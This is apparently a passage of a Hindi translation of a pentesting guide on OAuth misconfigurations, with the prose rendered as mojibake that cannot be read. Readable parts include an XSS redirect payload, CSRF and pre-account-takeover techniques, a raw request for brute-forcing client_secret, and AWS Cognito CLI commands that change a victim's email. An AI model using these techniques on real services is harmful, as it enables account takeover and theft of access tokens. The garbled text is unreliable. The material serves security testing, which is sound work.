рдпрджрд┐ рдЖрдк OpenID рд╕рд░реНрд╡рд░ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рддреЛ \*\*`.well-known/openid-configuration`\*\* рдкрд░ рдЦреЛрдЬ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХрднреА-рдХрднреА рдкреИрд░рд╛рдореАрдЯрд░ рдЬреИрд╕реЗ "_registration\_endpoint_", "_request\_uri\_parameter\_supported_", рдФрд░ "_require\_request\_uri\_registration_" рдХреЛ рд╕рдорд╛рд╡рд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИред рдпреЗ рдЖрдкрдХреЛ рдкрдВрдЬреАрдХрд░рдг рдПрдВрдбрдкреЙрдЗрдВрдЯ рдФрд░ рдЕрдиреНрдп рд╕рд░реНрд╡рд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдорд╛рдиреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### redirect рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдореЗрдВ XSS <a href="#bda5" id="bda5"></a>

рдЬреИрд╕рд╛ рдХрд┐ рдЗрд╕ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд░рд┐рдкреЛрд░реНрдЯ [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html) рдореЗрдВ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ **URL рд╕рд░реНрд╡рд░ рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рд╣реЛ рд░рд╣рд╛ рд╣реИ** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рдмрд╛рдж, **XSS рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛрдиреЗ рдХреЗ рдХрд╛рд░рдг**ред рдкрд░реАрдХреНрд╖рдг рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╛рд╡рд┐рдд рдкреЗрд▓реЛрдб:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - рд╕реНрдЯреЗрдЯ рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЕрдиреБрдЪрд┐рдд рд╕рдВрднрд╛рд▓ <a href="#bda5" id="bda5"></a>

рдЕрдХреНрд╕рд░, **`state` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЫреЛрдбрд╝ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдпрд╛ рдЧрд▓рдд рддрд░реАрдХреЗ рд╕реЗ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдпрджрд┐ рд╕реНрдЯреЗрдЯ рдкреИрд░рд╛рдореАрдЯрд░ **рдЕрдиреБрдкрд╕реНрдерд┐рдд рд╣реИ**, **рдпрд╛ рдПрдХ рд╕реНрдерд┐рд░ рдореВрд▓реНрдп** рд╣реИ рдЬреЛ рдХрднреА рдирд╣реАрдВ рдмрджрд▓рддрд╛, рддреЛ OAuth рдкреНрд░рд╡рд╛рд╣ рдмрд╣реБрдд рд╕рдВрднрд╛рд╡рдирд╛ рд╕реЗ **CSRF рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛрдЧрд╛**ред рдХрднреА-рдХрднреА, рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдЕрдЧрд░ рдПрдХ `state` рдкреИрд░рд╛рдореАрдЯрд░ рд╣реИ, рддреЛ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдХреЛрдИ рдорд╛рдиреНрдпрддрд╛ рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛** рдФрд░ рдПрдХ рд╣рдорд▓рд╛ рдХрд╛рдо рдХрд░реЗрдЧрд╛ред рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рдпрд╣ рд╣реЛрдЧрд╛ рдХрд┐ рдЖрдк рдЕрдкрдиреЗ рдЦрд╛рддреЗ рдкрд░ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ рдЧреБрдЬрд░реЗрдВ, рдФрд░ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдХреЗ рдареАрдХ рдмрд╛рдж рд░реБрдХреЗрдВред рддрдм рдЖрдкрдХреЛ рдЗрд╕ рддрд░рд╣ рдХрд╛ рдЕрдиреБрд░реЛрдз рдорд┐рд▓реЗрдЧрд╛:
```
https://yourtweetreader.com?code=asd91j3jd91j92j1j9d1
```
рдЗрд╕ рдЕрдиреБрд░реЛрдз рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рдЖрдк **рдЕрдиреБрд░реЛрдз рдХреЛ рдЫреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдпреЗ рдХреЛрдб рдЖрдорддреМрд░ рдкрд░ рдПрдХ рдмрд╛рд░ рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП рд╣реЛрддреЗ рд╣реИрдВ**ред рдлрд┐рд░ рдЖрдк рдЗрд╕ URL рдХреЛ рдПрдХ **рд▓реЙрдЧ-рдЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдпрд╣ рдЖрдкрдХреЗ рдЦрд╛рддреЗ рдХреЛ рдЙрдирдХреЗ рдЦрд╛рддреЗ рдореЗрдВ рдЬреЛрдбрд╝ рджреЗрдЧрд╛**ред рдкрд╣рд▓реА рдирдЬрд░ рдореЗрдВ, рдпрд╣ рдмрд╣реБрдд рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдирд╣реАрдВ рд▓рдЧ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рдХреЗрд╡рд▓ рдЕрдкрдиреЗ рдЦрд╛рддреЗ рдХреЛ рдПрдХ рдкреАрдбрд╝рд┐рдд рдХреЗ рдЦрд╛рддреЗ рдореЗрдВ рдЬреЛрдбрд╝ рд░рд╣реЗ рд╣реИрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХрдИ OAuth рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рд╕рд╛рдЗрди-рдЗрди рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╣реЛрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдк рдЕрдкрдиреЗ Google рдЦрд╛рддреЗ рдХреЛ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд▓реЙрдЧрд┐рди рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдк рдПрдХ рдХреНрд▓рд┐рдХ рдХреЗ рд╕рд╛рде **Account Takeover** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдЕрдкрдиреЗ Google рдЦрд╛рддреЗ рд╕реЗ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рд╕реЗ рдЖрдкрдХреЛ рдкреАрдбрд╝рд┐рдд рдХреЗ рдЦрд╛рддреЗ рддрдХ рдкрд╣реБрдВрдЪ рдорд┐рд▓ рдЬрд╛рдПрдЧреАред

рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдПрдХ **рдЙрджрд╛рд╣рд░рдг** рдЖрдк рдЗрд╕ [**CTF writeup**](https://github.com/gr455/ctf-writeups/blob/master/hacktivity20/notes\_surfer.md) рдореЗрдВ рдФрд░ **HTB box called Oouch** рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред

рдореИрдВрдиреЗ рдХрдИ рдмрд╛рд░ `state` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдПрдХ рдЕрддрд┐рд░рд┐рдХреНрдд рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдореВрд▓реНрдп рдХреЗ рд░реВрдк рдореЗрдВ рдЗрд╕реНрддреЗрдорд╛рд▓ рд╣реЛрддреЗ рджреЗрдЦрд╛ рд╣реИред рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкреНрд░рд╛рд░рдВрднрд┐рдХ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХреЗ рд▓рд┐рдП `redirect_uri` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛, рд▓реЗрдХрд┐рди рдлрд┐рд░ `state` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рджреВрд╕рд░реЗ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░реЗрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ рдХреНрд╡реЗрд░реА рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреЗ рднреАрддрд░ `code` рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдпрд╛ referer headerред

рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдмрд╛рдд рдпрд╣ рд╣реИ рдХрд┐ рдпрд╣ рдХреЗрд╡рд▓ рд▓реЙрдЧрд┐рди рдФрд░ рдЦрд╛рддрд╛ рдЕрдзрд┐рдЧреНрд░рд╣рдг рдкреНрд░рдХрд╛рд░ рдХреА рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдкрд░ рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред рдореИрдВрдиреЗ рдорд┐рд╕рдХреЙрдиреНрдлрд┐рдЧрд░реЗрд╢рди рджреЗрдЦреЗ рд╣реИрдВ:

* Slack рдЗрдВрдЯреАрдЧреНрд░реЗрд╢рди рдЬреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЙрдирдХреЗ Slack рдЦрд╛рддреЗ рдХреЛ рд╕рднреА рдиреЛрдЯрд┐рдлрд┐рдХреЗрд╢рди/рд╕рдВрджреЗрд╢реЛрдВ рдХреЗ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдЬреЛрдбрд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ
* Stripe рдЗрдВрдЯреАрдЧреНрд░реЗрд╢рди рдЬреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рднреБрдЧрддрд╛рди рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдФрд░ рдкреАрдбрд╝рд┐рдд рдХреЗ рдЧреНрд░рд╛рд╣рдХреЛрдВ рд╕реЗ рднреБрдЧрддрд╛рди рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ
* PayPal рдЗрдВрдЯреАрдЧреНрд░реЗрд╢рди рдЬреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЙрдирдХреЗ PayPal рдЦрд╛рддреЗ рдХреЛ рдкреАрдбрд╝рд┐рдд рдХреЗ рдЦрд╛рддреЗ рдореЗрдВ рдЬреЛрдбрд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдкреИрд╕рд╛ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ PayPal рдореЗрдВ рдЬрдорд╛ рд╣реЛрдЧрд╛

### Pre Account Takeover <a href="#ebe4" id="ebe4"></a>

рдПрдХ рдЕрдиреНрдп рдЖрдо рд╕рдорд╕реНрдпрд╛ рдЬреЛ рдореИрдВ рджреЗрдЦрддрд╛ рд╣реВрдВ рд╡рд╣ рд╣реИ рдЬрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди "Sign in with X" рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдпреВрдЬрд░рдиреЗрдо/рдкрд╛рд╕рд╡рд░реНрдб рднреАред рдЗрд╕ рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рджреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ рддрд░реАрдХреЗ рд╣реИрдВ:

1. рдпрджрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди **рдЦрд╛рддрд╛ рдирд┐рд░реНрдорд╛рдг рдкрд░ рдИрдореЗрд▓ рд╕рддреНрдпрд╛рдкрди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд░рдЦрддрд╛ рд╣реИ**, рддреЛ рдкреАрдбрд╝рд┐рдд рдХреЗ рдИрдореЗрд▓ рдкрддреЗ рдФрд░ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде **рдПрдХ рдЦрд╛рддрд╛ рдмрдирд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ** рдЗрд╕рд╕реЗ рдкрд╣рд▓реЗ рдХрд┐ рдкреАрдбрд╝рд┐рдд рдиреЗ рдкрдВрдЬреАрдХреГрдд рдХрд┐рдпрд╛ рд╣реЛред рдпрджрд┐ **рдкреАрдбрд╝рд┐рдд** рдлрд┐рд░ рдкрдВрдЬреАрдХрд░рдг рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ рдпрд╛ **рддреГрддреАрдп рдкрдХреНрд╖ рдХреЗ рд╕рд╛рде рд╕рд╛рдЗрди рдЗрди рдХрд░рддрд╛ рд╣реИ**, рдЬреИрд╕реЗ рдХрд┐ Google, рддреЛ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдПрдХ рд▓реБрдХрдЕрдк рдХрд░реЗрдЧрд╛, рджреЗрдЦреЗрдЧрд╛ рдХрд┐ рдИрдореЗрд▓ рдкрд╣рд▓реЗ рд╕реЗ рдкрдВрдЬреАрдХреГрдд рд╣реИ, рдлрд┐рд░ **рдЙрдирдХреЗ Google рдЦрд╛рддреЗ рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдП рдЧрдП рдЦрд╛рддреЗ рд╕реЗ рдЬреЛрдбрд╝ рджреЗрдЧрд╛**ред рдпрд╣ рдПрдХ "**pre account takeover**" рд╣реИ рдЬрд╣рд╛рдВ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкрд╛рд╕ рдкреАрдбрд╝рд┐рдд рдХреЗ рдЦрд╛рддреЗ рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛрдЧреА рдпрджрд┐ рдЙрдиреНрд╣реЛрдВрдиреЗ рдкреАрдбрд╝рд┐рдд рдХреЗ рдкрдВрдЬреАрдХрд░рдг рд╕реЗ рдкрд╣рд▓реЗ рдЗрд╕реЗ рдмрдирд╛рдпрд╛ рд╣реЛред
2. рдпрджрд┐ рдХреЛрдИ **OAuth рдРрдк рдИрдореЗрд▓ рд╕рддреНрдпрд╛рдкрди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд░рдЦрддрд╛ рд╣реИ**, рддреЛ рдЙрд╕ OAuth рдРрдк рдХреЗ рд╕рд╛рде рд╕рд╛рдЗрди рдЕрдк рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдФрд░ рдлрд┐рд░ рдИрдореЗрд▓ рдкрддреЗ рдХреЛ **рдкреАрдбрд╝рд┐рдд рдХреЗ рдИрдореЗрд▓ рдкрддреЗ** рдХреЗ рд╕рд╛рде рдмрджрд▓реЗрдВред рдКрдкрд░ рд╡рд░реНрдгрд┐рдд рд╕рдорд╕реНрдпрд╛ рд╡рд╣реА рд╣реЛ рд╕рдХрддреА рд╣реИ, рд▓реЗрдХрд┐рди рдЖрдк рдЗрд╕реЗ рджреВрд╕рд░реА рджрд┐рд╢рд╛ рд╕реЗ рд╣рдорд▓рд╛ рдХрд░ рд░рд╣реЗ рд╣реЛрдВрдЧреЗ рдФрд░ рдЦрд╛рддрд╛ рдЕрдзрд┐рдЧреНрд░рд╣рдг рдХреЗ рд▓рд┐рдП рдкреАрдбрд╝рд┐рдд рдХреЗ рдЦрд╛рддреЗ рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВрдЧреЗред

### Disclosure of Secrets <a href="#e177" id="e177"></a>

рдпрд╣ рдкрд╣рдЪрд╛рдирдирд╛ рдмрд╣реБрдд рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ **OAuth рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдореЗрдВ рд╕реЗ рдХреМрди рд╕реЗ рдЧреБрдкреНрдд рд╣реИрдВ**, рдФрд░ рдЙрдирдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХрд░рдирд╛ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `client_id` рдХрд╛ рд▓реАрдХ рд╣реЛрдирд╛ рдмрд┐рд▓рдХреБрд▓ рдареАрдХ рд╣реИ рдФрд░ рдЖрд╡рд╢реНрдпрдХ рд╣реИ, рд▓реЗрдХрд┐рди **`client_secret` рдХрд╛ рд▓реАрдХ рд╣реЛрдирд╛ рдЦрддрд░рдирд╛рдХ рд╣реИ**ред рдпрджрд┐ рдпрд╣ рд▓реАрдХ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ **рд╣рдорд▓рд╛рд╡рд░** рд╕рдВрднрд╡рддрдГ **рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдХреНрд▓рд╛рдЗрдВрдЯ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рдкрд╣рдЪрд╛рди рдФрд░ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ `access_tokens` рдФрд░ рдЙрдирдХреЗ рдЗрдВрдЯреАрдЧреНрд░реЗрдЯреЗрдб рдЦрд╛рддреЛрдВ рдХреЗ рд▓рд┐рдП рдирд┐рдЬреА рдЬрд╛рдирдХрд╛рд░реА/рдкрд╣реБрдВрдЪ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред рд╣рдорд╛рд░реЗ рдкрд╣рд▓реЗ рдЙрджрд╛рд╣рд░рдг рдкрд░ рд╡рд╛рдкрд╕ рдЬрд╛рддреЗ рд╣реБрдП, рдПрдХ рд╕рдорд╕реНрдпрд╛ рдЬреЛ рдореИрдВрдиреЗ рджреЗрдЦреА рд╣реИ рд╡рд╣ рд╣реИ рдЗрд╕ рдХрджрдо рдХреЛ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреА рдмрдЬрд╛рдп рд╕рд░реНрд╡рд░ рд╕реЗ рдХрд░рдирд╛:

_5._ [_https://yourtweetreader.com_](https://yourtweetreader.com) _рдлрд┐рд░ рдЙрд╕ `code` рдХреЛ рд▓реЗрдЧрд╛, рдФрд░ рдЙрдирдХреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ `client_id` рдФрд░ `client_secret` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдЖрдкрдХреА рдУрд░ рд╕реЗ рдПрдХ `access_token` рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рд░реНрд╡рд░ рд╕реЗ рдПрдХ рдЕрдиреБрд░реЛрдз рдХрд░реЗрдЧрд╛, рдЬреЛ рдЙрдиреНрд╣реЗрдВ рдЖрдкрдХреА рд╕рд╣рдорддрд┐ рджреА рдЧрдИ рдЕрдиреБрдорддрд┐рдпреЛрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред_

**рдпрджрд┐ рдпрд╣ рдХреНрд▓рд╛рдЗрдВрдЯ рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ `client_secret` рд▓реАрдХ рд╣реЛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рдУрд░ рд╕реЗ `access_tokens` рдЬрдирд░реЗрдЯ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдВрдЧреЗ**ред рдХреБрдЫ рд╕рд╛рдорд╛рдЬрд┐рдХ рдЗрдВрдЬреАрдирд┐рдпрд░рд┐рдВрдЧ рдХреЗ рд╕рд╛рде, рд╡реЗ OAuth рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдореЗрдВ **рдФрд░ рдЕрдзрд┐рдХ рд╕реНрдХреЛрдкреНрд╕ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдпрд╣ рд╕рдм рд╡реИрдз рдкреНрд░рддреАрдд рд╣реЛрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рдЕрдиреБрд░реЛрдз рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдХреНрд▓рд╛рдЗрдВрдЯ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реЗ рдЖрдПрдЧрд╛ред

### Client Secret Bruteforce

рдЖрдк рдХрд┐рд╕реА рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ рдХреЗ `client_secret` рдХреЛ **bruteforce рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рддрд╛рдХрд┐ рдЦрд╛рддреЛрдВ рдХреЛ рдЪреБрд░рд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред\
BF рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдз рдЗрд╕ рдкреНрд░рдХрд╛рд░ рджрд┐рдЦ рд╕рдХрддрд╛ рд╣реИ:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer Header рдореЗрдВ Code + State рдХрд╛ рд▓реАрдХ рд╣реЛрдирд╛

рдПрдХ рдмрд╛рд░ рдЬрдм рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рдкрд╛рд╕ **code рдФрд░ state** рд╣реЛрддреЗ рд╣реИрдВ, рдЕрдЧрд░ рдпрд╣ **Referer header рдореЗрдВ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рд╣реЛрддрд╛ рд╣реИ** рдЬрдм рд╡рд╣ рдПрдХ рдЕрд▓рдЧ рдкреЗрдЬ рдкрд░ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИред

### рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╣рд┐рд╕реНрдЯреНрд░реА рдореЗрдВ Access Token рдХрд╛ рд╕рдВрдЧреНрд░рд╣рдг

**рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╣рд┐рд╕реНрдЯреНрд░реА рдореЗрдВ рдЬрд╛рдПрдВ рдФрд░ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ access token рд╡рд╣рд╛рдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реИ**ред

### рд╕реНрдерд╛рдпреА Authorization Code

**Authorization code рдХреЛ рдХреЗрд╡рд▓ рдХреБрдЫ рд╕рдордп рдХреЗ рд▓рд┐рдП рдЬреАрд╡рд┐рдд рд░рд╣рдирд╛ рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдЗрд╕реЗ рдЪреБрд░рд╛рдиреЗ рдФрд░ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рд╕рдордп рд╕реАрдорд╛ рд╕реАрдорд┐рдд рд░рд╣реЗ**ред

### Authorization/Refresh Token рдХреНрд▓рд╛рдЗрдВрдЯ рд╕реЗ рдирд╣реАрдВ рдЬреБрдбрд╝рд╛ рд╣реБрдЖ

рдпрджрд┐ рдЖрдк **authorization code рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдПрдХ рдЕрд▓рдЧ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдЕрдиреНрдп рдЦрд╛рддреЛрдВ рдХрд╛ рдЕрдзрд┐рдЧреНрд░рд╣рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

### Happy Paths, XSS, Iframes & Post Messages рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ code & state рдорд╛рдиреЛрдВ рдХрд╛ рд▓реАрдХ рд╣реЛрдирд╛

### AWS Cognito <a href="#bda5" id="bda5"></a>

рдЗрд╕ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд░рд┐рдкреЛрд░реНрдЯ рдореЗрдВ: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ **AWS Cognito** рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╡рд╛рдкрд╕ рджрд┐рдпрд╛ рдЧрдпрд╛ **token** рд╢рд╛рдпрдж **рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐рдпрд╛рдВ рд░рдЦрддрд╛ рд╣реИ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдбреЗрдЯрд╛ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**ред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдИрдореЗрд▓ рдХреЛ рдПрдХ рдЕрд▓рдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдИрдореЗрд▓ рд╕реЗ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ**, рдЖрдк рдЕрдиреНрдп рдЦрд╛рддреЛрдВ рдХрд╛ **рдЕрдзрд┐рдЧреНрд░рд╣рдг** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
AWS cognito рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддреГрдд рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% embed url="https://cloud.hacktricks.xyz/pentesting-cloud/aws-pentesting/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum" %}

### рдЕрдиреНрдп рдРрдкреНрд╕ рдХреЗ рдЯреЛрдХрди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ <a href="#bda5" id="bda5"></a>

